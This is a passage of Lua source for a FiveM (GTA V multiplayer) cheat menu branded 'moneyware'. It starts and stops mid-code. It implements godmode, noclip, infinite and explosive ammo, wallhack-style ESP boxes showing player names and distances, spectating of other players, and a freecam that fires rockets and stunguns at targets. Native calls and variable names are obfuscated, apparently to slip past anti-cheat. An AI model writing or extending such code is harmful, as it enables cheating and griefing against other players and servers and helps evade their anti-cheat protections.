								ShootSingleBulletBetweenCoords(GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot), Markerloc, 0.0, false, GetHashKey("WEAPON_RPG"), peds[1], true, false, -1.0)
							end
						end
						

						
						if IsDisabledControlJustPressed(1, keys["MOUSE2"]) then
						local AllahBombAmmunation = true
							RequestWeaponAsset(GetHashKey("WEAPON_STUNGUN")) 
							while not HasWeaponAssetLoaded(GetHashKey("WEAPON_STUNGUN")) do
								Wait(0)
							end
							
							if peds[1] == PlayerPedId() then
								ShootSingleBulletBetweenCoords(GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot), Markerloc, 0.0, false, GetHashKey("WEAPON_STUNGUN"), peds[2], true, false, -1.0)
							else
								ShootSingleBulletBetweenCoords(GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot), Markerloc, 0.0, false, GetHashKey("WEAPON_STUNGUN"), peds[1], true, false, -1.0)
							end
						end
						
						if IsDisabledControlJustPressed(1, keys["Q"]) then
							RequestWeaponAsset(GetHashKey("WEAPON_ASSAULTRIFLE")) 
							while not HasWeaponAssetLoaded(GetHashKey("WEAPON_ASSAULTRIFLE")) do
								Wait(0)
							end
							
							if peds[1] == PlayerPedId() then
								ShootSingleBulletBetweenCoords(GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot), Markerloc, 0.0, false, GetHashKey("WEAPON_ASSAULTRIFLE"), peds[2], true, false, -1.0)
							else
								ShootSingleBulletBetweenCoords(GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot), Markerloc, 0.0, false, GetHashKey("WEAPON_ASSAULTRIFLE"), peds[1], true, false, -1.0)
							end
						end
						
						if IsDisabledControlJustPressed(1, keys["X"]) then
							RequestWeaponAsset(GetHashKey("WEAPON_FIREWORK")) 
							while not HasWeaponAssetLoaded(GetHashKey("WEAPON_FIREWORK")) do
								Wait(0)
							end
							
							if peds[1] == PlayerPedId() then
								ShootSingleBulletBetweenCoords(GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot), Markerloc, 0.0, false, GetHashKey("WEAPON_FIREWORK"), peds[2], true, false, -1.0)
							else
								ShootSingleBulletBetweenCoords(GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot), Markerloc, 0.0, false, GetHashKey("WEAPON_FIREWORK"), peds[1], true, false, -1.0)
							end
						end
					end
					
					ObjectPreviev = true
					
					if currentmode == "Create Objects" then
						SlynnyText("Freecam Mode (CreateObjects) [Click Arrows For More Modes]",true,0.19,0,0.02, 0.18)
				        DrawRect(0.11, 0.19, 0.19, 0.025, 0, 0, 0, 150)
                        DrawRect(0.11, 0.235, 0.19, 0.06, 0, 0, 0, 150)
                        SlynnyText("[~b~moneyware~s~] Click (~r~MOUSE2~s~) to Place Object",true,0.22,0,0.02, 0.206)
						
						if ObjectPreviev then
							if object_freecam == nil then
								object_freecam = CreateObject(GetHashKey("prop_container_hole"), Markerloc, true, false, true)	
							else
								if not IsDisabledControlPressed(1, 24) then
									SetEntityCoords(object_freecam, Markerloc)
									SetEntityVisible(object_freecam, false, false)
									SetEntityLocallyVisible(object_freecam)
									SetEntityAlpha(object_freecam, 150)
									SetEntityCollision(object_freecam, false, false)
									if IsDisabledControlPressed(1, 38) then -- E
										if freecam_object_heading == nil then
											freecam_object_heading = GetEntityHeading(object_freecam)
										end
										freecam_object_heading = freecam_object_heading + 1 + 0.0
										if freecam_object_heading >= 360.0 then
											freecam_object_heading = 0.0
										end
									end
									
									if IsDisabledControlPressed(1, 44) then -- Q
										if freecam_object_heading == nil then
											freecam_object_heading = GetEntityHeading(object_freecam)
										end
										freecam_object_heading = freecam_object_heading - 1 + 0.0
										if freecam_object_heading <= 0.0 then
											freecam_object_heading = 360.0
										end
									end
									SetEntityRotation(object_freecam, freecam_cam_rot)
									SetEntityHeading(object_freecam, freecam_object_heading)
								end
							end
						else
							object_freecam = nil
						end
						
						if IsDisabledControlJustPressed(1, keys["MOUSE2"]) then
							local object = CreateObject(GetHashKey("prop_container_hole"), Markerloc, true, false, true)
							SetEntityHeading(object, freecam_object_heading)
						end
					else
						SetEntityAsMissionEntity(object_freecam, true, true)
						DeleteEntity(object_freecam)
						object_freecam = nil
					end
						
							
					
					-------------------------------------------------------------------------------------------------------------------------------------------------
					if not Freecam then
						DestroyCam(freecam_cam, false)
						ClearTimecycleModifier()
						RenderScriptCams(false, false, 0, 1, 0)
						FreezeEntityPosition(GetPlayerPed(), false)
						SetFocusEntity(GetPlayerPed())
						break;
					end
					if not Displayed then
            
                    local playerPed = GetPlayerPed()
                    local playerRot = GetEntityRotation(playerPed, 2)

            
                    local rotX = playerRot.x
                    local rotY = playerRot.y
                    local rotZ = playerRot.z
            
                    offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * 8.0)
                    offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * 8.0)
            
                    if (offsetRotX > 90.0) then 
                        offsetRotX = 90.0 
                    elseif (offsetRotX < -90.0) then 
                        offsetRotX = -90.0 
                    end
            
                    if (offsetRotY > 90.0) then 
                        offsetRotY = 90.0 
                    elseif (offsetRotY < -90.0) then 
                        offsetRotY = -90.0 
                    end
            
                    if (offsetRotZ > 360.0) then 
                        offsetRotZ = offsetRotZ - 360.0 
                    elseif (offsetRotZ < -360.0) then 
                        offsetRotZ = offsetRotZ + 360.0 
                    end

                    local x, y, z = table.unpack(GetCamCoord(freecam_cam))
                    if IsDisabledControlPressed(1, 32) then -- Coords
						if IsDisabledControlPressed(1, 21) then
							SetCamCoord(freecam_cam, GetCamCoord(freecam_cam) + (RotationToDirection(freecam_cam_rot) * (0.5 * Sliderson.Sliderki[11].value * 3.5)))
						else
							SetCamCoord(freecam_cam, GetCamCoord(freecam_cam) + (RotationToDirection(freecam_cam_rot) * (0.5 * Sliderson.Sliderki[11].value)))
						end
                    elseif IsDisabledControlPressed(1, 33) then
                        SetCamCoord(freecam_cam, GetCamCoord(freecam_cam) - (RotationToDirection(freecam_cam_rot) * (0.5 * Sliderson.Sliderki[11].value)))
                    end

                    if (IsDisabledControlPressed(1, 21)) then -- SHIFT
                        z = z + (0.1 * 2.5)
                    end
                    if (IsDisabledControlPressed(1, 36)) then -- LEFT CTRL
                        z = z - (0.1 * 0.5)
                    end

                    SetFocusArea(GetCamCoord(freecam_cam).x, GetCamCoord(freecam_cam).y, GetCamCoord(freecam_cam).z, 0.0, 0.0, 0.0)
                    SetCamRot(freecam_cam, offsetRotX, offsetRotY, offsetRotZ, 2)
					
					--DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.35, 0.35, 0.35, 0,255,255, 175, false, true, 2, nil, nil, false)
					if IsDisabledControlJustPressed(1, keys["RIGHT"]) then
						tryb = tryb + 1
						if tryb > #modes then
							tryb = 1
						end
					end

					if IsDisabledControlJustPressed(1, keys["LEFT"]) then
						tryb = tryb - 1
						if tryb < 1 then
							tryb = #modes
						end
					end
				
					if currentmode == "Look Around" then
					    SlynnyText("Freecam Mode (Look Around) [Click Arrows For More Modes]",true,0.18,0,0.02, 0.18)
				        DrawRect(0.11, 0.19, 0.19, 0.025, 0, 0, 0, 150)
                        DrawRect(0.11, 0.235, 0.19, 0.06, 0, 0, 0, 150)
                        SlynnyText("[~b~moneyware~s~] Click (~r~C~s~) to Clone Entity",true,0.22,0,0.02, 0.206)
                        SlynnyText("[~b~moneyware~s~] Click (~r~Home~s~) to Delete Entity",true,0.22,0,0.02, 0.225)
					
					
					elseif currentmode == "Shoot" then
						SlynnyText("Freecam Mode (Shoot) [Click Arrows For More Modes]",true,0.18,0,0.02, 0.18)
				        DrawRect(0.11, 0.19, 0.19, 0.025, 0, 0, 0, 150)
                        DrawRect(0.11, 0.235, 0.19, 0.06, 0, 0, 0, 150)
                        SlynnyText("[~b~moneyware~s~] Click (~r~MOUSE2~s~) to Shoot With StunGun",true,0.22,0,0.02, 0.206)
                        SlynnyText("[~b~moneyware~s~] Click (~r~R~s~) to Shoot With Rocket",true,0.22,0,0.02, 0.225)
                        SlynnyText("[~b~moneyware~s~] Click (~r~Q~s~) to Shoot With AK-47",true,0.22,0,0.02, 0.243)
				        		
					end
					
					end
				end

			end
        end]]

        if Noclip then
    local isInVehicle = Invoken(0x997ABD671D25CA0B, PlayerPedId(), 0)
    local k = nil
    local x, y, z = nil
    if not isInVehicle then
        k = PlayerPedId()
        x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
    else
        k = GetVehiclePedIsIn(PlayerPedId(), 0)
        x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
    end
    if isInVehicle then
        RequestControlOnce(k)
    end
    local dx, dy, dz = DCamDirection()
    Invoken(0xEA1C610A04DB6BBB, PlayerPedId(), 0, 0)
    Invoken(0xEA1C610A04DB6BBB, k, 0, 0)
    Invoken(0x1C99BB7B6E96D16F, k, 0.0001, 0.0001, 0.0001)
   
    if Invoken(0xE2587F8CBBD87B1D, 0, 32) then -- MOVE FORWARD
        x = x + Sliderson.Sliderki[12].value * dx
        y = y + Sliderson.Sliderki[12].value * dy
        z = z + Sliderson.Sliderki[12].value * dz
    end
    if Invoken(0xE2587F8CBBD87B1D, 0, 269) then -- MOVE BACK
        x = x - Sliderson.Sliderki[12].value * dx
        y = y - Sliderson.Sliderki[12].value * dy
        z = z - Sliderson.Sliderki[12].value * dz
    end
    if Invoken(0xE2587F8CBBD87B1D, 0, keys["SPACE"]) then -- MOVE UP
        z = z + Sliderson.Sliderki[12].value
    end
    if Invoken(0xE2587F8CBBD87B1D, 0, keys["LEFTCTRL"]) then -- MOVE DOWN
        z = z - Sliderson.Sliderki[12].value
    end
    SetFocusArea(
        GetEntityCoords(PlayerPedId()).x,
        GetEntityCoords(PlayerPedId()).y,
        GetEntityCoords(PlayerPedId()).z,
        0.0,
        0.0,
        0.0
    )
    Invoken(0x239A3351AC1DA385, k, x, y, z, true, true, true)
end

       if IsDisabledControlJustPressed(0, keys[freecamkeybind]) and not Freecam then
           Freecam = not Freecam
       end

       if IsDisabledControlJustPressed(0, keys[NoclipKeybind]) then
           Noclip = not Noclip
       end
       if crosshaircustom then


        if dot then
        DrawRect(0.5, 0.5, 0.0015, 0.0025, Sliderson.Sliderki[8].value, Sliderson.Sliderki[9].value, Sliderson.Sliderki[10].value, 255) -- kropka
        end

        DrawRect(0.493 - Sliderson.Sliderki[5].value / 10 / 10 / 10, 0.5, 0.006 + Sliderson.Sliderki[6].value / 10 / 10 / 10 , 0.002 + Sliderson.Sliderki[7].value / 10 / 10 / 6, Sliderson.Sliderki[8].value, Sliderson.Sliderki[9].value, Sliderson.Sliderki[10].value, 255) -- lewo
        DrawRect(0.507 + Sliderson.Sliderki[5].value / 10 / 10 / 10, 0.5, 0.006 + Sliderson.Sliderki[6].value / 10 / 10 / 10, 0.002 + Sliderson.Sliderki[7].value / 10 / 10 / 6, Sliderson.Sliderki[8].value, Sliderson.Sliderki[9].value, Sliderson.Sliderki[10].value, 255) -- prawo

        DrawRect(0.5, 0.488 - Sliderson.Sliderki[5].value / 10 / 10 / 10, 0.001 + Sliderson.Sliderki[7].value / 10 / 10 / 9, 0.01 + Sliderson.Sliderki[6].value / 10 / 10 / 10, Sliderson.Sliderki[8].value, Sliderson.Sliderki[9].value, Sliderson.Sliderki[10].value, 255) -- dol
        DrawRect(0.5, 0.512 + Sliderson.Sliderki[5].value / 10 / 10 / 10, 0.001 + Sliderson.Sliderki[7].value / 10 / 10 / 9, 0.01 + Sliderson.Sliderki[6].value / 10 / 10 / 10, Sliderson.Sliderki[8].value, Sliderson.Sliderki[9].value, Sliderson.Sliderki[10].value, 255) -- gora
       end

     if fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                SetPedMoveRateOverride(PlayerPedId(), Sliderson.Sliderki[13].value+0.0)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                SetPedMoveRateOverride(PlayerPedId(), 1.0)
            end
            if FallD then
            SetPedCanRagdoll(PlayerPedId(), false)
        else
            SetPedCanRagdoll(PlayerPedId(), true)
            end

    if Godmode then
    Invoken(0x3882114BDE571AD4, Invoken(0x43A66C31C68491C0, -1), true)
    Invoken(0x239528EACDC3E7DE, Invoken(0x4F8644AF03D0E0D6), true)
    Invoken(0x8FE22675A5A45817, Invoken(0x43A66C31C68491C0, -1))
    Invoken(0x3AC1F7B898F30C05, Invoken(0x43A66C31C68491C0, -1))
    Invoken(0x0E98F88A24C5F4B8, Invoken(0x43A66C31C68491C0, -1))
    Invoken(0xFAEE099C6F890BB8, Invoken(0x43A66C31C68491C0, -1), true, true, true, true, true, true, true, true)
    Invoken(0x79F020FF9EDC0748, Invoken(0x43A66C31C68491C0, -1), false)
    Invoken(0x1760FFA8AB074D66, Invoken(0x43A66C31C68491C0, -1), false)
else
    Invoken(0x3882114BDE571AD4, Invoken(0x43A66C31C68491C0, -1), false)
    Invoken(0x239528EACDC3E7DE, Invoken(0x4F8644AF03D0E0D6), false)
    Invoken(0x0E98F88A24C5F4B8, Invoken(0x43A66C31C68491C0, -1))
    Invoken(0xFAEE099C6F890BB8, Invoken(0x43A66C31C68491C0, -1), false, false, false, false, false, false, false, false)
    Invoken(0x79F020FF9EDC0748, Invoken(0x43A66C31C68491C0, -1), true)
    Invoken(0x1760FFA8AB074D66, Invoken(0x43A66C31C68491C0, -1), true)
end

if SuperJump then
                SetSuperJumpThisFrame(PlayerId())
            end
            
            if NeverWanted then
                ClearPlayerWantedLevel(PlayerId())
            end

if Task_Jump and not IsPedInAnyVehicle(GetPlayerPed(-1)) then
  if IsDisabledControlPressed(1, keys["SPACE"]) then -- (chyba)
    TaskJump(GetPlayerPed(-1), true)
    Citizen.Wait(Sliderson.Sliderki[15].value)
  end
end

if UnlCombatRoll then
    for i = 0, 3 do
        StatSetInt(GetHashKey("mp" .. i .. "_shooting_ability"), 9999, true)
        StatSetInt(GetHashKey("sp" .. i .. "_shooting_ability"), 9999, true)
    end
else
    for i = 0, 3 do
        StatSetInt(GetHashKey("mp" .. i .. "_shooting_ability"), 0, true)
        StatSetInt(GetHashKey("sp" .. i .. "_shooting_ability"), 0, true)
    end
end
RequestStreamedTextureDict("darts", true)
          if CoolCrosshair then
          DrawSprite("darts", "dart_reticules", 0.5, 0.5, 0.02, 0.03, 0.0, 255,255,255, 255) 
          end

          if GoodCrosshair then
          DrawSprite("darts", "dart_reticules", 0.5, 0.5, 0.01, 0.02, 0.0, 255,255,255, 255) 
          end

        if Modifier then
    Invoken(0xCE07B9F7817AADA3, Invoken(0x4F8644AF03D0E0D6), Sliderson.Sliderki[20].value + 0.0)
    Invoken(0x4A3DC7ECCC321032, Invoken(0x4F8644AF03D0E0D6), Sliderson.Sliderki[20].value + 0.0)
     else
    Invoken(0xCE07B9F7817AADA3, Invoken(0x4F8644AF03D0E0D6), 1.0)
    Invoken(0x4A3DC7ECCC321032, Invoken(0x4F8644AF03D0E0D6), 1.0)
    end

    if InfAmmo then
    for y=1, #AllGuns do
        SetPedInfiniteAmmoClip(PlayerPedId(), true)
        SetPedInfiniteAmmo(PlayerPedId(), true, "WEAPON_"..AllGuns[y])
    end
else
    for y=1, #AllGuns do
        Invoken(0x183DADC6AA953186, Invoken(0xD80958FC74E988A6), false)
        Invoken(0x3EDCB0505123623B, Invoken(0xD80958FC74E988A6), false, "WEAPON_"..AllGuns[y])
    end
end  

if box_drawrect then
    if ESP_Enable then

if ESP_Preview then
    if obramowka and ESP_Preview  then
        box_obramowka = true
    end
    if box_drawrect and ESP_Preview then
        esp_drawrect = true
    end
          for pPed in Enumerate_moneywarePeds() do
          local x, y, z = table.unpack(GetEntityCoords(pPed))
          local onScreen,_x,_y=World3dToScreen2d(x,y,z)
          local wh = 1.85 / GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(pPed), true) 
          if custom_color then
          DrawRect(_x,_y, wh/3, wh, r1, r2, r3, _alpha)
          else
         --      DrawRect(_x,_y, wh/3.2, wh/1.05, 0, 0, 0, 60)
          DrawRect(_x,_y, wh/3, wh, 0, 0, 0, 60)
          if obramowka then
          DrawSprite("helicopterhud","hud_lock",_x,_y,wh/3,wh,0.0,255,255,255,255)
          else end
          if Box2 then
          DrawSprite("trafficcam","traffic_junction_box",_x,_y,wh/3,wh,0.0,255,255,255,255)
          else end
        
          end
          end
      end
  end
          end


if NoReload then
    SetPedInfiniteAmmo(PlayerPedId(), true)
else
    SetPedInfiniteAmmo(PlayerPedId(), false)
end

if Exammo then
    if
        Invoken(0x475768A975D5AD17, PlayerPedId(), 7) and
            Invoken(0x475768A975D5AD17, PlayerPedId(), 6)
     then
        local x, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
        if x then
            Invoken(0xE3AD2BDBAEE269AC, coords, Sliderson.Sliderki[23].value, 100000.0, true, false, 0.0)
        end
    end
end

if Spectate then
    FreezeEntityPosition(GetPlayerPed(-1), true)
    local spectate_cam = spectate_cam
    if not spectate_cam ~= nil then
    spectate_cam = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
    end
    RenderScriptCams(1, 0, 0, 1, 1)
    SetCamActive(spectate_cam, true)
    local coords_SSS = GetEntityCoords(GetPlayerPed(SelectedPlayer))
    SetCamCoord(spectate_cam, coords_SSS.x, coords_SSS.y, coords_SSS.z+3)

    local offsetRotX = 0.0
    local offsetRotY = 0.0
    local offsetRotZ = 0.0
    
    DisableControlAction(0, 32, true) -- W
    DisableControlAction(0, 31, true) -- S
    DisableControlAction(0, 30, true) -- D
    DisableControlAction(0, 34, true) -- A
                        
    local weapondelay = 0

    while DoesCamExist(spectate_cam) do
        Wait(0)
        if not Spectate then
            DestroyCam(spectate_cam, false)
            ClearTimecycleModifier()
            RenderScriptCams(false, false, 0, 1, 0)
            FreezeEntityPosition(GetPlayerPed(-1), false)
            SetFocusEntity(GetPlayerPed(-1))
            break;
        end
        
        

        local playerPed = GetPlayerPed(SelectedPlayer)
        local playerRot = GetEntityRotation(playerPed, 2)


        local rotX = playerRot.x
        local rotY = playerRot.y
        local rotZ = playerRot.z

        offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * 8.0)
        offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * 8.0)

        if (offsetRotX > 90.0) then 
            offsetRotX = 90.0 
        elseif (offsetRotX < -90.0) then 
            offsetRotX = -90.0 
        end

        if (offsetRotY > 90.0) then 
            offsetRotY = 90.0 
        elseif (offsetRotY < -90.0) then 
            offsetRotY = -90.0 
        end

        if (offsetRotZ > 360.0) then 
            offsetRotZ = offsetRotZ - 360.0 
        elseif (offsetRotZ < -360.0) then 
            offsetRotZ = offsetRotZ + 360.0 
        end

        local x, y, z = table.unpack(GetCamCoord(spectate_cam))
        local coords_ES = GetEntityCoords(GetPlayerPed(SelectedPlayer)) + (RotationToDirection(GetCamRot(spectate_cam, 2)) * (0.5 * 1.5))
        
        if IsDisabledControlPressed(1, 44) then
            z_DSFHSUDGDS = z_DSFHSUDGDS + 0.2
        end
    
        if IsDisabledControlPressed(1, 48) then
            z_DSFHSUDGDS = z_DSFHSUDGDS - 0.2
        end
        
        SetCamCoord(spectate_cam, coords_ES.x, coords_ES.y, coords_ES.z+3+z_DSFHSUDGDS)
        
    

    if not Displayed then
        SetFocusArea(GetCamCoord(spectate_cam).x, GetCamCoord(spectate_cam).y, GetCamCoord(spectate_cam).z, 0.0, 0.0, 0.0)
        SetCamRot(spectate_cam, offsetRotX, offsetRotY, offsetRotZ, 2)
        
    end
end
end

    end
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if esp_duhsgiudfgdfg then
            for i= 1, 256 do
              if  ((Invoken(0xB8DFD30D6973E135, i )) and Invoken(0x43A66C31C68491C0, i ) ~= Invoken(0x43A66C31C68491C0, -1 )) then
                local kolorek_espa_xd_IDHFUDSHUIFDSF = {r = 0, g = 191, b = 41}
                local pPed_dushsigdsfgdf = Invoken(0x43A66C31C68491C0, i)
                local cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf = table.unpack(GetEntityCoords_skidmeni_asdIUhjasd(Invoken(0xD80958FC74E988A6, -1)))
                local x, y, z = table.unpack(GetEntityCoords(pPed_dushsigdsfgdf))
                local disPlayerNames_udsguydgdresd = 130
                local disPlayerNamesz_dusghudfhigsdfg = 999999
                local distance_idshgisudfgsdfg = math.floor(GetDistanceBetweenCoords(cx_duihsgiudfgdf,  cy_duhifsudgsdfg,  cz_dsyaugfidsgsdf,  x,  y,  z,  true))
                  if nameabove_duhsgsiudgsdgrdf then
                      if ((distance_idshgisudfgsdfg < disPlayerNames_udsguydgdresd)) then
                        if Invoken(0x031E11F3D447647E, i, Citizen.ReturnResultAnyway()) then
                          DrawText3D_UDGUYSDHUGSFFDG(x, y, z+1.2, GetPlayerServerId(i).." |  "..GetPlayerName(i), 21, 0, 255)
                        else
                          DrawText3D_UDGUYSDHUGSFFDG(x, y, z+1.2, GetPlayerServerId(i).." |  "..GetPlayerName(i), kolorek_espa_xd_IDHFUDSHUIFDSF.r, kolorek_espa_xd_IDHFUDSHUIFDSF.g, kolorek_espa_xd_IDHFUDSHUIFDSF.b)
                        end
                      end
                  end
                local message_UDYUGSIDGFDG =
                "Name: "..
                GetPlayerName(i) ..
                "\nServer ID: "..
                GetPlayerServerId(i) ..
                "\nDist: ".. math.round(GetDistanceBetweenCoords(cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf, x, y, z, true), 1)
                if ((distance_idshgisudfgsdfg < disPlayerNamesz_dusghudfhigsdfg)) then
                if espinfo_ihfdsoudgifgdfg then
                  DrawText3D_UDGUYSDHUGSFFDG(x, y, z - 1.0, message_UDYUGSIDGFDG, 255, 255, 255)
                end
                if espbox_dsuhfisdugsdfg and esp_duhsgiudfgdfg then
                  local LineOneBegin_GDUYSYUFDGREGDFG = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, -0.3, -0.3, -0.9)
                  local LineOneEnd_DUIYGUISHIGFDGFDG = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, -0.3, -0.9)
                  local LineTwoBegin_UIDSGISDGGFDGF = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, -0.3, -0.9)
                  local LineTwoEnd_DISUIHFIUSDGDF = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, 0.3, -0.9)
                  local LineThreeBegin_UDHIGUFFDGIHUDF = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, 0.3, -0.9)
                  local LineThreeEnd_DSUYFTUDSGYFDSFG = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, -0.3, 0.3, -0.9)
                  local LineFourBegin_SUAYGFTDGSUYFSD = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, -0.3, -0.3, -0.9)

                  local TLineOneBegin_DGUFYHDSIGDFHU = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, -0.3, -0.3, 0.8)
                  local TLineOneEnd_UDGUFYIHIFGDFG = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, -0.3, 0.8)
                  local TLineTwoBegin_DIOUHGIUDFGDF = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, -0.3, 0.8)
                  local TLineTwoEnd_DSUGHIUFSDGDF = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, 0.3, 0.8)
                  local TLineThreeBegin_IDUSHGIUDFGDF = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, 0.3, 0.8)
                  local TLineThreeEnd_DUSYGUIDSGDF = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, -0.3, 0.3, 0.8)
                  local TLineFourBegin_DSUGYFISDGDF = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, -0.3, -0.3, 0.8)

                  local ConnectorOneBegin_DSUGHISDUGDFG = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, -0.3, 0.3, 0.8)
                  local ConnectorOneEnd_DUSGIHUDGDFG = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, -0.3, 0.3, -0.9)
                  local ConnectorTwoBegin_USDHIUFDSGDFG = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, 0.3, 0.8)
                  local ConnectorTwoEnd_QUTGFIDYGFSUGFSG = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, 0.3, -0.9)
                  local ConnectorThreeBegin_LDSIGHSDGHKDFSGDF = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, -0.3, -0.3, 0.8)
                  local ConnectorThreeEnd_UAIDGYIHDSHGODF = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, -0.3, -0.3, -0.9)
                  local ConnectorFourBegin_SDUYFGTUDSIGDFG = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, -0.3, 0.8)
                  local ConnectorFourEnd_ASUHYFIUDSGDFG = GetOffsetFromEntityInWorldCoords(pPed_dushsigdsfgdf, 0.3, -0.3, -0.9)

                  Invoken(0x6B7256074AE34680, 
                  LineOneBegin_GDUYSYUFDGREGDFG.x,
                  LineOneBegin_GDUYSYUFDGREGDFG.y,
                  LineOneBegin_GDUYSYUFDGREGDFG.z,
                  LineOneEnd_DUIYGUISHIGFDGFDG.x,
                  LineOneEnd_DUIYGUISHIGFDGFDG.y,
                  LineOneEnd_DUIYGUISHIGFDGFDG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  LineTwoBegin_UIDSGISDGGFDGF.x,
                  LineTwoBegin_UIDSGISDGGFDGF.y,
                  LineTwoBegin_UIDSGISDGGFDGF.z,
                  LineTwoEnd_DISUIHFIUSDGDF.x,
                  LineTwoEnd_DISUIHFIUSDGDF.y,
                  LineTwoEnd_DISUIHFIUSDGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  LineThreeBegin_UDHIGUFFDGIHUDF.x,
                  LineThreeBegin_UDHIGUFFDGIHUDF.y,
                  LineThreeBegin_UDHIGUFFDGIHUDF.z,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.x,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.y,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  LineThreeEnd_DSUYFTUDSGYFDSFG.x,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.y,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.z,
                  LineFourBegin_SUAYGFTDGSUYFSD.x,
                  LineFourBegin_SUAYGFTDGSUYFSD.y,
                  LineFourBegin_SUAYGFTDGSUYFSD.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  TLineOneBegin_DGUFYHDSIGDFHU.x,
                  TLineOneBegin_DGUFYHDSIGDFHU.y,
                  TLineOneBegin_DGUFYHDSIGDFHU.z,
                  TLineOneEnd_UDGUFYIHIFGDFG.x,
                  TLineOneEnd_UDGUFYIHIFGDFG.y,
                  TLineOneEnd_UDGUFYIHIFGDFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  TLineTwoBegin_DIOUHGIUDFGDF.x,
                  TLineTwoBegin_DIOUHGIUDFGDF.y,
                  TLineTwoBegin_DIOUHGIUDFGDF.z,
                  TLineTwoEnd_DSUGHIUFSDGDF.x,
                  TLineTwoEnd_DSUGHIUFSDGDF.y,
                  TLineTwoEnd_DSUGHIUFSDGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  TLineThreeBegin_IDUSHGIUDFGDF.x,
                  TLineThreeBegin_IDUSHGIUDFGDF.y,
                  TLineThreeBegin_IDUSHGIUDFGDF.z,
                  TLineThreeEnd_DUSYGUIDSGDF.x,
                  TLineThreeEnd_DUSYGUIDSGDF.y,
                  TLineThreeEnd_DUSYGUIDSGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  TLineThreeEnd_DUSYGUIDSGDF.x,
                  TLineThreeEnd_DUSYGUIDSGDF.y,
                  TLineThreeEnd_DUSYGUIDSGDF.z,
                  TLineFourBegin_DSUGYFISDGDF.x,
                  TLineFourBegin_DSUGYFISDGDF.y,
                  TLineFourBegin_DSUGYFISDGDF.z,
